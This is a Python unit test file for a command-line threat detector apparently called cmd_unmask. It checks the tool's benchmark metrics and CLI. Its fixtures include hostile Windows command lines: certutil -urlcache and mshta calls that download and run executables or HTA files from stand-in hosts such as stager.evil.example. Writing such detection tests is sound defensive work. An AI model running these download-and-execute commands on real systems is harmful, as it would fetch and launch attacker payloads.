import io
import json
import tempfile
import unittest
from contextlib import redirect_stdout
from pathlib import Path

from cmd_unmask.benchmark import (
    compute_percentile,
    evaluate_fixture,
    render_benchmark_pretty,
    run_benchmark,
)
from cmd_unmask.cli import main as cli_main
from cmd_unmask.corpus import load_seed_corpus
from cmd_unmask.models import BenchmarkReport, CorpusFixture, Severity
from cmd_unmask.renderer import render_benchmark_summary


class TestBenchmarkRunnerAndMetrics(unittest.TestCase):
    def test_latency_percentile_tracking(self):
        self.assertEqual(compute_percentile([], 50), 0.0)
        self.assertEqual(compute_percentile([4.0], 95), 4.0)
        samples = [float(i) for i in range(1, 21)]  # 1.0 .. 20.0
        self.assertAlmostEqual(compute_percentile(samples, 50), 10.5, places=2)
        self.assertGreaterEqual(compute_percentile(samples, 95), 19.0)

    def test_precision_recall_f1_fpr_math(self):
        fixtures = [
            CorpusFixture(fixture_id="tp-1", label="malicious", command="certutil -urlcache -f http://a.example/x.exe x.exe", min_severity=Severity.HIGH),
            CorpusFixture(fixture_id="fp-1", label="benign", command="certutil -urlcache -f http://b.example/x.exe x.exe", expected_severity=Severity.BENIGN),
            CorpusFixture(fixture_id="fn-1", label="malicious", command="dir C:\\", min_severity=Severity.HIGH),
            CorpusFixture(fixture_id="tn-1", label="benign", command="git status", expected_severity=Severity.BENIGN),
        ]
        report = run_benchmark(fixtures)
        self.assertIsInstance(report, BenchmarkReport)
        self.assertEqual(report.total, 4)
        self.assertEqual(report.true_positives, 1)
        self.assertEqual(report.false_positives, 1)
        self.assertEqual(report.false_negatives, 1)
        self.assertEqual(report.true_negatives, 1)
        self.assertAlmostEqual(report.precision, 0.5, places=4)
        self.assertAlmostEqual(report.recall, 0.5, places=4)
        self.assertAlmostEqual(report.f1_score, 0.5, places=4)
        self.assertAlmostEqual(report.fpr, 0.5, places=4)
        self.assertGreaterEqual(report.p50_ms, 0.0)
        self.assertGreaterEqual(report.p95_ms, report.p50_ms)

    def test_evaluate_fixture_assertion_failures(self):
        bad_ioc = CorpusFixture(
            fixture_id="fail-ioc",
            label="malicious",
            command="certutil -urlcache -f http://cdn.evil.example/a.exe a.exe",
            expected_techniques=["T9999"],
            expected_iocs=["missing.evil.example"],
            must_not_match=["cdn.evil.example"],
        )
        result = evaluate_fixture(bad_ioc)
        self.assertFalse(result.passed)
        joined = " | ".join(result.failures)
        self.assertIn("T9999", joined)
        self.assertIn("missing.evil.example", joined)
        self.assertIn("must_not_match", joined)

    def test_seed_corpus_passes_with_zero_fpr(self):
        fixtures = load_seed_corpus()
        report = run_benchmark(fixtures)
        self.assertGreaterEqual(report.total, 50)
        self.assertEqual(report.failed, 0, f"Seed corpus failures: {[r for r in report.results if not r.passed]}")
        self.assertEqual(report.false_positives, 0)
        self.assertEqual(report.false_negatives, 0)
        self.assertAlmostEqual(report.precision, 1.0, places=4)
        self.assertAlmostEqual(report.recall, 1.0, places=4)
        self.assertAlmostEqual(report.f1_score, 1.0, places=4)
        self.assertAlmostEqual(report.fpr, 0.0, places=4)
        self.assertGreaterEqual(len(report.category_stats), 4)
        for stats in report.category_stats.values():
            self.assertIn("accuracy", stats)
            self.assertIn("p50_ms", stats)
            self.assertEqual(stats["failed"], 0)

    def test_render_benchmark_pretty(self):
        fixtures = load_seed_corpus()[:2]
        report = run_benchmark(fixtures)
        rendered = render_benchmark_pretty(report, no_color=True)
        self.assertIn("Precision", rendered)
        self.assertIn("Recall", rendered)
        self.assertIn("F1", rendered)
        self.assertIn("FPR", rendered)
        self.assertIn("p50", rendered)
        self.assertIn("p95", rendered)

    def test_cli_benchmark_builtin_and_json_format(self):
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = cli_main(["--benchmark", "--no-color"])
        self.assertEqual(rc, 0)
        out = buf.getvalue()
        self.assertIn("Regression Corpus Benchmark", out)
        self.assertIn("PASS", out)

        buf_json = io.StringIO()
        with redirect_stdout(buf_json):
            rc_json = cli_main(["--benchmark", "--format", "json"])
        self.assertEqual(rc_json, 0)
        payload = json.loads(buf_json.getvalue())
        self.assertEqual(payload["failed"], 0)
        self.assertEqual(payload["fpr"], 0.0)
        self.assertIn("f1_score", payload)

    def test_cli_corpus_dir_and_max_fpr_gate(self):
        with tempfile.TemporaryDirectory() as tmpdir:
            cdir = Path(tmpdir)
            (cdir / "benign.jsonl").write_text(
                json.dumps(
                    {
                        "fixture_id": "fp-gate-1",
                        "label": "benign",
                        "command": "certutil.exe -urlcache -f http://cdn.evil.example/a.exe a.exe",
                        "expected_severity": "MEDIUM",
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            (cdir / "malicious.jsonl").write_text(
                json.dumps(
                    {
                        "fixture_id": "tp-gate-1",
                        "label": "malicious",
                        "command": "mshta.exe http://stager.evil.example/drop.hta",
                        "min_severity": "MEDIUM",
                    }
                )
                + "\n",
                encoding="utf-8",
            )
            buf = io.StringIO()
            with redirect_stdout(buf):
                rc = cli_main(["--benchmark", "--corpus-dir", str(cdir), "--max-fpr", "0.0", "--no-color"])
            self.assertEqual(rc, 2)
            self.assertIn("FAIL", buf.getvalue())

            buf_missing = io.StringIO()
            with redirect_stdout(buf_missing):
                rc_err = cli_main(["--benchmark", str(cdir / "missing.jsonl")])
            self.assertEqual(rc_err, 1)

    def test_renderer_benchmark_summary_table(self):
        report = run_benchmark(load_seed_corpus()[:4])
        summary = render_benchmark_summary(report, color=False)
        self.assertIn("Precision", summary)
        self.assertIn("FPR", summary)
        self.assertIn("p95", summary)
        self.assertIn("Category Breakdown", summary)

        verbose_summary = render_benchmark_summary(report, color=False, verbose=True)
        self.assertIn("Fixture Results", verbose_summary)
        self.assertIn("ben-001", verbose_summary)

    def test_cli_benchmark_verbose_flag(self):
        buf = io.StringIO()
        with redirect_stdout(buf):
            rc = cli_main(["--benchmark", "--verbose", "--no-color"])
        self.assertEqual(rc, 0)
        out = buf.getvalue()
        self.assertIn("Category Breakdown", out)
        self.assertIn("Fixture Results", out)
        self.assertIn("mal-001", out)


if __name__ == "__main__":
    unittest.main()
